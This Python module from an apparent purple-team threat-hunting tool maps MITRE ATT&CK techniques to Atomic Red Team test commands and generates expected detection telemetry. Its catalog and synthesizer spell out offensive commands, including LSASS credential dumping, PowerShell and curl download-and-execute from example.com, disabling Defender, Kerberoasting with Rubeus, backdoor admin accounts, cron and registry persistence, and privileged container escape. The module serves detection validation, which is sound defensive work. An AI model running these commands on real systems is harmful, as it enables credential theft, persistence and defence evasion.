"""Atomic Red Team (ART) test mappings and validation procedure generation.

Maps MITRE ATT&CK techniques to concrete Atomic Red Team test identifiers,
test commands, and expected telemetry signatures to enable purple-team
validation of threat hunting hypotheses and detection rules.
"""

import json
import os
import re
from pathlib import Path
from typing import Any, Dict, List, Optional

# Curated catalog of Atomic Red Team tests for prominent enterprise techniques
ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
    "T1003.001": [
        {
            "name": "Dump LSASS.exe Memory using ProcDump",
            "test_id": "ART T1003.001 #1",
            "command": "procdump.exe -ma lsass.exe lsass.dmp",
            "telemetry": "Sysmon Event ID 10 (ProcessAccess to lsass.exe) / MDE DeviceProcessEvents",
        },
        {
            "name": "Dump LSASS.exe Memory using comsvcs.dll MiniDump",
            "test_id": "ART T1003.001 #3",
            "command": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #24 <lsass_pid> C:\\Windows\\Temp\\lsass.dmp full",
            "telemetry": "Sysmon Event ID 10 / Process Creation Event ID 4688 (rundll32.exe loading comsvcs.dll)",
        },
    ],
    "T1059.001": [
        {
            "name": "PowerShell Download and Execute",
            "test_id": "ART T1059.001 #1",
            "command": 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://example.com/payload.ps1 -OutFile $env:TEMP\\p.ps1; & $env:TEMP\\p.ps1"',
            "telemetry": "Windows Event ID 4104 (ScriptBlock Logging) / Sysmon Event ID 1 (powershell.exe with -EncodedCommand or -Command)",
        },
        {
            "name": "PowerShell Base64 Encoded Command Execution",
            "test_id": "ART T1059.001 #2",
            "command": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAA=",
            "telemetry": "Windows Event ID 4104 / EDR process command-line audit",
        },
    ],
    "T1059.003": [
        {
            "name": "Windows Command Shell Obfuscation and Execution",
            "test_id": "ART T1059.003 #1",
            "command": 'cmd.exe /c "set a=who& set b=ami& %a%%b%"',
            "telemetry": "Windows Event ID 4688 / Sysmon Event ID 1 (cmd.exe execution with concatenated variables)",
        },
    ],
    "T1055": [
        {
            "name": "Process Injection via CreateRemoteThread",
            "test_id": "ART T1055 #1",
            "command": "Execute test harness writing shellcode to target process memory and invoking CreateRemoteThread",
            "telemetry": "Sysmon Event ID 8 (CreateRemoteThread) / MDE DeviceEvents (CreateRemoteThreadApiCall)",
        },
    ],
    "T1053.005": [
        {
            "name": "Scheduled Task Creation via schtasks",
            "test_id": "ART T1053.005 #1",
            "command": 'schtasks /create /sc minute /mo 1 /tn "AtomicValidationTask" /tr "calc.exe"',
            "telemetry": "Windows Event ID 4698 (A scheduled task was created) / Sysmon Event ID 1 (schtasks.exe /create)",
        },
    ],
    "T1562.001": [
        {
            "name": "Disable Windows Defender Real-Time Protection",
            "test_id": "ART T1562.001 #1",
            "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
            "telemetry": "Windows Defender Event ID 5001 / PowerShell Event ID 4104",
        },
    ],
    "T1021.002": [
        {
            "name": "SMB Admin Share Mounting",
            "test_id": "ART T1021.002 #1",
            "command": "net use \\\\<target_host>\\C$ /user:<domain>\\<user> <password>",
            "telemetry": "Windows Event ID 5140 (A network share object was accessed) / Event ID 4624 (Type 3 Logon)",
        },
    ],
    "T1078": [
        {
            "name": "Local Account Creation and Group Addition",
            "test_id": "ART T1078 #1",
            "command": "net user /add atomic_hunter TempPass123! && net localgroup administrators atomic_hunter /add",
            "telemetry": "Windows Event ID 4720 (A user account was created) / 4728 (Member added to security group)",
        },
    ],
    "T1558.003": [
        {
            "name": "Kerberoasting via ServicePrincipalName Ticket Request",
            "test_id": "ART T1558.003 #1",
            "command": "Rubeus.exe kerberoast /nowrap /format:hashcat",
            "telemetry": "Windows Security Event ID 4769 (Kerberos Service Ticket Request with ticket encryption 0x17)",
        },
    ],
    "T1558.004": [
        {
            "name": "AS-REP Roasting for Accounts with Pre-Authentication Disabled",
            "test_id": "ART T1558.004 #1",
            "command": "Rubeus.exe asreproast /format:hashcat /nowrap",
            "telemetry": "Windows Security Event ID 4768 (TGT Request with Pre-Authentication Type 0 from non-DC client)",
        },
    ],
    "T1550.001": [
        {
            "name": "Application Access Token / OAuth Consent Abuse",
            "test_id": "ART T1550.001 #1",
            "command": "Emulate illicit OAuth application consent grant holding Mail.ReadWrite or Directory.ReadWrite.All scopes",
            "telemetry": "Entra ID / M365 Audit Log: 'Consent to application' / 'Add service principal'",
        },
    ],
    "T1071.001": [
        {
            "name": "Web Protocols C2 Periodic Beaconing",
            "test_id": "ART T1071.001 #1",
            "command": 'Invoke-RestMethod -Uri https://example.com/api/v1/ping -Headers @{"X-Beacon-ID"="test-42"} -Method Post',
            "telemetry": "Proxy / Web Gateway logs / Sysmon Event ID 3 (Network connection to external destination)",
        },
    ],
    "T1105": [
        {
            "name": "Ingress Tool Transfer via certutil.exe",
            "test_id": "ART T1105 #1",
            "command": "certutil.exe -urlcache -split -f http://example.com/test.txt C:\\Windows\\Temp\\test.txt",
            "telemetry": "Sysmon Event ID 1 (certutil.exe with -urlcache argument) / Event ID 11 (File creation in Temp)",
        },
        {
            "name": "Ingress Tool Transfer via curl / wget",
            "test_id": "ART T1105 #2",
            "command": "curl -s -O http://example.com/payload.sh && chmod +x payload.sh",
            "telemetry": "Sysmon Linux Event ID 1 (Image: /usr/bin/curl) / Event ID 11 (File creation)",
        },
    ],
    "T1059.004": [
        {
            "name": "Unix Shell Script Execution and Subshell Invocation",
            "test_id": "ART T1059.004 #1",
            "command": "/bin/sh -c whoami",
            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /bin/sh, CommandLine: /bin/sh -c whoami)",
        },
        {
            "name": "Bash Interactive Reverse Shell Spawn",
            "test_id": "ART T1059.004 #2",
            "command": "/bin/bash -i",
            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /bin/bash)",
        },
    ],
    "T1190": [
        {
            "name": "Exploitation of Public-Facing Web Application Endpoint",
            "test_id": "ART T1190 #1",
            "command": "curl -X POST http://127.0.0.1:8080/ping.php -d 'action=test'",
            "telemetry": "Webserver Access Log (cs-method: POST, cs-uri-stem: /ping.php) / Process Execution",
        },
        {
            "name": "Web Server Worker Spawning Interactive Command Shell",
            "test_id": "ART T1190 #2",
            "command": "/bin/sh -c id",
            "telemetry": "Sysmon Linux Event ID 1 (ParentImage: /usr/sbin/php-fpm, Image: /bin/sh)",
        },
    ],
    "T1574.002": [
        {
            "name": "DLL Side-Loading via Search Order Hijacking",
            "test_id": "ART T1574.002 #1",
            "command": "Place mock payload DLL into writable application folder alongside signed binary and execute binary",
            "telemetry": "Sysmon Event ID 7 (ImageLoad) of unsigned DLL from user-writable directory",
        },
    ],
    "T1036.005": [
        {
            "name": "Masquerading as Windows System Binary",
            "test_id": "ART T1036.005 #1",
            "command": "copy C:\\Windows\\System32\\cmd.exe C:\\Users\\Public\\svchost.exe && C:\\Users\\Public\\svchost.exe /c whoami",
            "telemetry": "Sysmon Event ID 1 (svchost.exe executing outside C:\\Windows\\System32\\)",
        },
    ],
    "T1082": [
        {
            "name": "System Information Discovery via Native Commands",
            "test_id": "ART T1082 #1",
            "command": "systeminfo && hostname && whoami",
            "telemetry": "Windows Event ID 4688 / Sysmon Event ID 1 (systeminfo.exe process creation)",
        },
    ],
    "T1016": [
        {
            "name": "System Network Configuration Discovery",
            "test_id": "ART T1016 #1",
            "command": "ipconfig /all & route print & netstat -ano",
            "telemetry": "Windows Event ID 4688 / Sysmon Event ID 1 (network discovery commands)",
        },
    ],
    "T1047": [
        {
            "name": "WMI Process Creation via wmic.exe",
            "test_id": "ART T1047 #1",
            "command": 'wmic process call create "calc.exe"',
            "telemetry": "Windows Event ID 4688 (wmic.exe with process call create) / WMI-Activity Event ID 5861",
        },
    ],
    "T1543.003": [
        {
            "name": "Create Windows Service via sc.exe",
            "test_id": "ART T1543.003 #1",
            "command": 'sc.exe create MaliciousService binPath= "C:\\Windows\\Temp\\srv.exe" start= auto',
            "telemetry": "Sysmon Event ID 1 (sc.exe create) / Event ID 12/13 (Registry modification in HKLM\\System\\CurrentControlSet\\Services)",
        },
    ],
    "T1059.007": [
        {
            "name": "Wscript / Cscript Script Execution",
            "test_id": "ART T1059.007 #1",
            "command": "cscript.exe //B //Nologo C:\\Windows\\Temp\\stage.js",
            "telemetry": "Sysmon Event ID 1 (cscript.exe or wscript.exe executing script in Temp directory)",
        },
    ],
    "T1070.004": [
        {
            "name": "File Deletion with cipher and sdelete",
            "test_id": "ART T1070.004 #1",
            "command": "cipher.exe /w:C:\\Windows\\Temp & del /f /q C:\\Windows\\Temp\\*.tmp",
            "telemetry": "Sysmon Event ID 1 (cipher.exe with /w argument) / Event ID 23 (FileDelete)",
        },
    ],
    "T1547.001": [
        {
            "name": "Persistence via Registry Run Key",
            "test_id": "ART T1547.001 #1",
            "command": 'reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveUpdate" /t REG_SZ /d "C:\\Users\\Public\\update.exe" /f',
            "telemetry": "Sysmon Event ID 1 (reg.exe add) / Event ID 13 (RegistryValueAdded to ...\\Run)",
        },
    ],
    "T1027": [
        {
            "name": "Base64 Decoding via certutil.exe",
            "test_id": "ART T1027 #1",
            "command": "certutil.exe -decode C:\\Users\\Public\\payload.b64 C:\\Users\\Public\\payload.exe",
            "telemetry": "Sysmon Event ID 1 (certutil.exe with -decode) / Event ID 11 (File creation of payload.exe)",
        },
    ],
    "T1087.001": [
        {
            "name": "Enumerate Local Users via net.exe",
            "test_id": "ART T1087.001 #1",
            "command": "net.exe user && net.exe localgroup administrators",
            "telemetry": "Sysmon Event ID 1 / Windows Event ID 4688 (net.exe user)",
        },
    ],
    "T1087.002": [
        {
            "name": "Enumerate Domain Accounts via net.exe",
            "test_id": "ART T1087.002 #1",
            "command": "net.exe user /domain",
            "telemetry": "Sysmon Event ID 1 / Windows Event ID 4688 (net.exe user /domain)",
        },
    ],
    "T1053.003": [
        {
            "name": "Linux Cron Persistence via /etc/cron.d",
            "test_id": "ART T1053.003 #1",
            "command": "echo \"* * * * * root /bin/bash -c '/dev/shm/c2.sh'\" > /etc/cron.d/test_backdoor",
            "telemetry": "Linux auditd / Sysmon Event ID 11 (TargetFilename: /etc/cron.d/test_backdoor)",
        },
    ],
    "T1610": [
        {
            "name": "Deploy Privileged Container with Host Mount",
            "test_id": "ART T1610 #1",
            "command": "docker run --rm --privileged -v /:/host ubuntu:latest nsenter --target 1 --mount -- /bin/bash",
            "telemetry": "Container Runtime telemetry (Image: ubuntu:latest, Privileged: true, VolumeMount: /:/host)",
        },
    ],
}


def load_custom_atomic_tests(
    workspace: Optional[Path] = None,
) -> Dict[str, List[Dict[str, str]]]:
    """Load custom Atomic Red Team test mappings from workspace or user configuration.

    Allows operators to supply custom or organization-specific atomic tests in:
    1. HECATE_ATOMIC_TESTS environment variable (file path)
    2. workspace / "knowledge" / "atomic_tests.yaml" or ".json"
    3. ~/.hecate/atomic_tests.yaml or ".json"
    """
    candidates: List[Path] = []
    env_path = os.environ.get("HECATE_ATOMIC_TESTS")
    if env_path:
        candidates.append(Path(env_path))

    if workspace:
        candidates.append(workspace / "knowledge" / "atomic_tests.yaml")
        candidates.append(workspace / "knowledge" / "atomic_tests.json")
    else:
        cwd = Path.cwd()
        candidates.append(cwd / "knowledge" / "atomic_tests.yaml")
        candidates.append(cwd / "knowledge" / "atomic_tests.json")

    home = Path.home() / ".hecate"
    candidates.append(home / "atomic_tests.yaml")
    candidates.append(home / "atomic_tests.json")

    for path in candidates:
        if path.is_file():
            try:
                text = path.read_text(encoding="utf-8")
                if path.suffix.lower() in (".yaml", ".yml"):
                    try:
                        import yaml

                        data = yaml.safe_load(text)
                    except ImportError:
                        continue
                else:
                    data = json.loads(text)

                if isinstance(data, dict):
                    normalized: Dict[str, List[Dict[str, str]]] = {}
                    for tid, tests in data.items():
                        if isinstance(tests, list):
                            clean_tests = []
                            for t in tests:
                                if isinstance(t, dict) and "name" in t and "command" in t:
                                    clean_tests.append(
                                        {
                                            "name": str(t.get("name", "")),
                                            "test_id": str(t.get("test_id", f"ART {tid}")),
                                            "command": str(t.get("command", "")),
                                            "telemetry": str(t.get("telemetry", "Sensor logs")),
                                        }
                                    )
                            if clean_tests:
                                normalized[str(tid).strip()] = clean_tests
                    if normalized:
                        return normalized
            except Exception:
                continue
    return {}


_WINDOWS_INDICATORS = re.compile(
    r"\.exe\b|\.dll\b|\.sys\b|powershell|cmd\.exe|c:\\|schtasks|wmic|systeminfo|ipconfig|net\s+use|net\s+user|rubeus|certutil|rundll32|reg\.exe|windows event id|sysmon event id",
    re.IGNORECASE,
)


def _is_test_compatible_with_platforms(test: Dict[str, str], platforms: Optional[List[str]]) -> bool:
    if not platforms:
        return True
    plats = [str(p).lower() for p in platforms]
    is_windows = any("win" in p for p in plats)
    if is_windows:
        return True
    cmd = test.get("command", "")
    name = test.get("name", "")
    telemetry = test.get("telemetry", "")
    combined = f"{cmd} {name} {telemetry}"
    return not bool(_WINDOWS_INDICATORS.search(combined))


def get_atomic_tests(
    technique_id: str,
    workspace: Optional[Path] = None,
    platforms: Optional[List[str]] = None,
) -> List[Dict[str, str]]:
    """Return matching Atomic Red Team test descriptors for an ATT&CK technique.

    Looks up:
    1. Workspace or user custom atomic test definitions
    2. Curated sub-technique then base technique in ATOMIC_TESTS_MAP (filtered by platform)

    Returns an empty list when neither has a test for the technique and platforms.
    """
    tid = technique_id.strip()
    custom = load_custom_atomic_tests(workspace)
    if tid in custom:
        filtered = [t for t in custom[tid] if _is_test_compatible_with_platforms(t, platforms)]
        if filtered:
            return filtered

    base_tid = tid.split(".")[0]
    if base_tid in custom:
        filtered = [t for t in custom[base_tid] if _is_test_compatible_with_platforms(t, platforms)]
        if filtered:
            return filtered

    if tid in ATOMIC_TESTS_MAP:
        filtered = [t for t in ATOMIC_TESTS_MAP[tid] if _is_test_compatible_with_platforms(t, platforms)]
        if filtered:
            return filtered

    if base_tid in ATOMIC_TESTS_MAP:
        filtered = [t for t in ATOMIC_TESTS_MAP[base_tid] if _is_test_compatible_with_platforms(t, platforms)]
        if filtered:
            return filtered

    # No test is mapped. H-0021 and H-0025 listed "ART T1190 (Procedural)" with the
    # command "# Execute controlled simulation of ...": a test that does not exist,
    # presented as a validation step.
    return []


def format_atomic_tests_markdown(
    techniques: List[str],
    workspace: Optional[Path] = None,
    platforms: Optional[List[str]] = None,
) -> str:
    """Format matching Atomic Red Team tests as markdown for hunt briefs."""
    if not techniques:
        return ""

    lines = [
        "### Validation Procedure (Atomic Red Team)",
        "",
        "Execute these tests in a non-production test host to confirm detection logic and telemetry visibility:",
        "",
        "| Technique | Test ID | Procedure / Command | Expected Telemetry |",
        "|---|---|---|---|",
    ]

    seen_tests = set()
    unmapped: List[str] = []
    for tid in techniques:
        tests = get_atomic_tests(tid, workspace=workspace, platforms=platforms)
        if not tests:
            unmapped.append(tid)
        for t in tests:
            test_key = (tid, t["test_id"])
            if test_key in seen_tests:
                continue
            seen_tests.add(test_key)
            cmd = t["command"].replace("|", "\\|")
            telemetry = t["telemetry"].replace("|", "\\|")
            lines.append(f"| `{tid}` | **{t['test_id']}**<br>*{t['name']}* | `{cmd}` | {telemetry} |")

    scope = f" on {'/'.join(platforms)}" if platforms else ""
    missing = ", ".join(f"`{t}`" for t in unmapped)
    if not seen_tests:
        return "\n".join(
            [
                "### Validation Procedure (Atomic Red Team)",
                "",
                f"No Atomic Red Team test is mapped for {missing}{scope}. Validate the rules by "
                "reproducing the source's procedure in a lab, or with telemetry from a real event.",
                "",
            ]
        )
    if unmapped:
        lines += ["", f"No Atomic Red Team test is mapped for {missing}{scope}."]
    lines.append("")
    return "\n".join(lines)


def synthesize_atomic_telemetry(
    technique_id: str,
    workspace: Optional[Path] = None,
    platforms: Optional[List[str]] = None,
) -> Dict[str, List[Dict[str, Any]]]:
    """Synthesize structured, high-fidelity Sigma telemetry events from Atomic Red Team tests.

    Returns a mapping of logsource category to candidate intrusion telemetry events:
    - process_creation
    - file_event
    - registry_set / registry_event
    - network_connection
    - dns_query
    - container_runtime / kubernetes_audit
    - cloud_audit / identity_audit
    """
    from typing import Any

    tid = technique_id.strip().upper()
    events: Dict[str, List[Dict[str, Any]]] = {}

    def add(cat: str, evt: Dict[str, Any]) -> None:
        bucket = events.setdefault(cat, [])
        if evt not in bucket:
            bucket.append(evt)

    # 1. Specialized High-Fidelity Synthesizers for prominent enterprise techniques
    if tid == "T1059.001":
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://example.com/payload.ps1 -OutFile $env:TEMP\\p.ps1; & $env:TEMP\\p.ps1"',
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": "NT AUTHORITY\\SYSTEM",
            },
        )
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAA=",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "User": "DOMAIN\\Administrator",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Windows\\Temp\\p.ps1",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            },
        )
        add(
            "network_connection",
            {
                "DestinationHostname": "example.com",
                "DestinationPort": 80,
                "Image": "powershell.exe",
                "Initiated": "true",
            },
        )
    elif tid == "T1543.003":
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\sc.exe",
                "CommandLine": 'sc.exe create MaliciousService binPath= "C:\\Windows\\Temp\\srv.exe" start= auto',
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": "NT AUTHORITY\\SYSTEM",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Windows\\Temp\\srv.exe",
                "Image": "C:\\Windows\\System32\\sc.exe",
            },
        )
        add(
            "registry_set",
            {
                "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousService\\ImagePath",
                "Details": "C:\\Windows\\Temp\\srv.exe",
                "Image": "C:\\Windows\\System32\\services.exe",
            },
        )
        add(
            "registry_event",
            {
                "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousService",
                "Image": "C:\\Windows\\System32\\sc.exe",
            },
        )
    elif tid == "T1053.005":
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\schtasks.exe",
                "CommandLine": 'schtasks.exe /create /sc minute /mo 1 /tn "AtomicValidationTask" /tr "calc.exe"',
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": "NT AUTHORITY\\SYSTEM",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Windows\\System32\\Tasks\\AtomicValidationTask",
                "Image": "C:\\Windows\\System32\\schtasks.exe",
            },
        )
    elif tid == "T1547.001":
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\reg.exe",
                "CommandLine": 'reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveUpdate" /t REG_SZ /d "C:\\Users\\Public\\update.exe" /f',
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "registry_set",
            {
                "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
                "Details": "C:\\Users\\Public\\update.exe",
                "Image": "C:\\Windows\\System32\\reg.exe",
            },
        )
        add(
            "registry_event",
            {
                "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
                "Image": "C:\\Windows\\System32\\reg.exe",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Users\\Public\\update.exe",
                "Image": "C:\\Windows\\System32\\reg.exe",
            },
        )
    elif tid == "T1003.001":
        add(
            "process_creation",
            {
                "Image": "procdump.exe",
                "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #24 624 C:\\Windows\\Temp\\lsass.dmp full",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp",
                "Image": "C:\\Windows\\System32\\rundll32.exe",
            },
        )
    elif tid == "T1059.007":
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\cscript.exe",
                "CommandLine": "cscript.exe //B //Nologo C:\\Windows\\Temp\\stage.js",
                "ParentImage": "C:\\Windows\\explorer.exe",
            },
        )
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\wscript.exe",
                "CommandLine": "wscript.exe //E:jscript C:\\Windows\\Temp\\stage.js",
                "ParentImage": "C:\\Windows\\explorer.exe",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Windows\\Temp\\stage.js",
                "Image": "C:\\Windows\\System32\\cscript.exe",
            },
        )
    elif tid == "T1070.004":
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\cipher.exe",
                "CommandLine": "cipher.exe /w:C:\\Windows\\Temp",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Windows\\Temp\\evidence.tmp",
                "Image": "C:\\Windows\\System32\\cmd.exe",
            },
        )
    elif tid in ("T1027", "T1105"):
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil.exe -decode C:\\Users\\Public\\payload.b64 C:\\Users\\Public\\payload.exe",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil.exe -urlcache -split -f http://example.com/test.txt C:\\Windows\\Temp\\test.txt",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Users\\Public\\payload.exe",
                "Image": "C:\\Windows\\System32\\certutil.exe",
            },
        )
        add(
            "file_event",
            {
                "TargetFilename": "C:\\Windows\\Temp\\test.txt",
                "Image": "C:\\Windows\\System32\\certutil.exe",
            },
        )
        add(
            "network_connection",
            {
                "DestinationHostname": "example.com",
                "DestinationPort": 80,
                "Image": "certutil.exe",
            },
        )
    elif tid in ("T1087.001", "T1087.002", "T1087"):
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\net.exe",
                "CommandLine": "net.exe user",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\net1.exe",
                "CommandLine": "net1.exe localgroup administrators",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\net.exe",
                "CommandLine": "net.exe user /domain",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
    elif tid == "T1053.003":
        add(
            "file_event",
            {
                "TargetFilename": "/etc/cron.d/test_backdoor",
                "Image": "/bin/bash",
            },
        )
        add(
            "process_creation",
            {
                "Image": "/usr/bin/crontab",
                "CommandLine": "crontab -l",
                "ParentImage": "/bin/bash",
            },
        )
        add(
            "process_creation",
            {
                "Image": "/bin/bash",
                "CommandLine": "/bin/bash -c '/dev/shm/c2.sh'",
                "ParentImage": "/usr/sbin/cron",
            },
        )
    elif tid == "T1610":
        add(
            "container_runtime",
            {
                "Image": "ubuntu:latest",
                "ContainerName": "atomic-container-escape",
                "CommandLine": "nsenter --target 1 --mount -- /bin/bash",
                "Privileged": "true",
                "VolumeMount": "/:/host",
            },
        )
        add(
            "kubernetes_audit",
            {
                "verb": "create",
                "resource": "pods",
                "requestObject.spec.containers.securityContext.privileged": "true",
            },
        )
    elif tid == "T1562.001":
        add(
            "process_creation",
            {
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
        add(
            "registry_set",
            {
                "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring",
                "Details": "1",
                "Image": "powershell.exe",
            },
        )
    elif tid == "T1036.005":
        add(
            "process_creation",
            {
                "Image": "C:\\Users\\Public\\svchost.exe",
                "CommandLine": "C:\\Users\\Public\\svchost.exe -k netsvcs",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        )
    elif tid == "T1071.001":
        add(
            "network_connection",
            {
                "DestinationHostname": "c2-beacon.example.com",
                "DestinationIp": "198.51.100.99",
                "DestinationPort": 443,
                "Image": "powershell.exe",
            },
        )
        add(
            "dns_query",
            {
                "QueryName": "c2-beacon.example.com",
                "Image": "powershell.exe",
            },
        )
    elif tid == "T1059.004":
        add(
            "process_creation",
            {
                "Image": "/bin/sh",
                "CommandLine": "/bin/sh -c id",
                "ParentImage": "/usr/sbin/php-fpm",
                "User": "www-data",
            },
        )
        add(
            "process_creation",
            {
                "Image": "/bin/bash",
                "CommandLine": "/bin/bash -i",
                "ParentImage": "/usr/sbin/apache2",
                "User": "nginx",
            },
        )
    elif tid == "T1190":
        add(
            "webserver",
            {
                "cs-method": "POST",
                "cs-uri-stem": "/ping.php",
                "c-uri": "http://127.0.0.1:8080/ping.php",
                "sc-status": "200",
            },
        )
        add(
            "process_creation",
            {
                "Image": "/bin/sh",
                "CommandLine": "/bin/sh -c id",
                "ParentImage": "/usr/sbin/php-fpm",
                "User": "www-data",
            },
        )
        add(
            "process_creation",
            {
                "Image": "/usr/bin/python3",
                "CommandLine": "python3 tooling/checker/checker.py",
                "ParentImage": "/bin/bash",
                "User": "app",
            },
        )

    # 2. General Fallback from Atomic Red Team Tests definition
    tests = get_atomic_tests(tid, workspace=workspace, platforms=platforms)
    for t in tests:
        cmd = str(t.get("command") or "").strip()
        if not cmd or cmd.startswith("#"):
            continue
        first_token = cmd.split()[0].replace('"', "").replace("'", "")
        add(
            "process_creation",
            {
                "CommandLine": cmd,
                "Image": first_token,
                "ParentImage": "cmd.exe" if ".exe" in first_token.lower() else "/bin/bash",
            },
        )

        paths = re.findall(r"(?:[a-zA-Z]:\\[^\s\"';&|]+|/(?:etc|tmp|var|dev|usr|home)/[^\s\"';&|]+)", cmd)
        for p in paths:
            if not p.endswith((".exe", ".dll", ".so")):
                add("file_event", {"TargetFilename": p, "Image": first_token})

        net_matches = re.findall(r"https?://([a-zA-Z0-9.-]+(?::\d+)?)", cmd)
        for target in net_matches:
            host = target.split(":")[0]
            port = int(target.split(":")[1]) if ":" in target else 80
            add(
                "network_connection",
                {"DestinationHostname": host, "DestinationPort": port, "Image": first_token},
            )
            add("dns_query", {"QueryName": host, "Image": first_token})

    return events
